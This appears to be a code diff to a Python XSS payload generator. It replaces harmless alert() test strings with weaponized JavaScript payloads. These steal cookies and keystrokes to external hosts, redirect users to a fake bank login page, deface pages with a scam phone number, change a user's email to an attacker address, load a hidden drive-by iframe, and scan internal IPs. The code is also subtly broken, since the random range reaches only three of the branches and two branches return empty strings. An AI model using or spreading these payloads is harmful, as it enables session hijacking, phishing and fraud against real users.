@@ -17,10 +17,26 @@ class XSSPayloadGenerator:
     def _get_random_xss_alert() -> str:
         """Returns a random JavaScript alert/execution string."""
         choice = random.randint(0, 2)
-        if choice == 0:
-            return "alert(1)"
-        elif choice == 1:
-            return "alert(document.domain)"
+        if choice == 0: # Session Hijacking / Cookie Theft
+            return 'new Image().src = "https://wenojhdskdsf.com/log_cookie.php?c=" + document.cookie;'
+        elif choice == 1: # Redirection to a Malicious Site (Phishing)
+            return 'window.location.href = "https://pankofamerika.com/fake_login";'
+        elif choice == 2: # Defacement / Content Modification
+            return "document.body.innerHTML = '<h1>Trust me!</h1><p>Call me at 1 888 345 8443.</p>';"
+        elif choice == 3: # Defacement / Content Modification
+            return "document.getElementById('header').innerHTML = '<img src=\"http://wererddf.com/evil_logo.png\">';"
+        elif choice == 4: # Keylogging
+            return "document.onkeypress = function(e) { var key = String.fromCharCode(e.keyCode); new Image().src = \"http://attacker.com/log_keys.php?k=\" + encodeURIComponent(key);};"
+        elif choice == 5: # Performing Actions on Behalf of the User (CSRF-like actions)
+            return "fetch('/api/user/change_email', {method: 'POST', headers: {'Content-Type': 'application/json' },body: JSON.stringify({ newEmail: 'attacker@evil.com' }) }) .then(response => console.log('Email change attempt:', response.status));"
+        elif choice == 6: #  Drive-by Downloads
+            return "var iframe = document.createElement('iframe');iframe.src = 'http://malicious-site.com/exploit.html';  iframe.style.display = 'none';document.body.appendChild(iframe);"
+        elif choice == 7: # Internal Network Scanning / Port Scanning
+            return "var internalIPs = ['192.168.1.1', '10.0.0.5'];internalIPs.forEach(function(ip) { var img = new Image(); img.onerror = function() { console.log(ip + ' is down or port closed'); }; img.onload = function() { console.log(ip + ' is up!'); }; img.src = 'http://' + ip + ':80/nonexistent.jpg';  });"
+        elif choice == 8: # 
+            return ""
+        elif choice == 9: # 
+            return ""
         else:
             return "console.log('XSS')" # Less disruptive, might bypass some WAFs
 
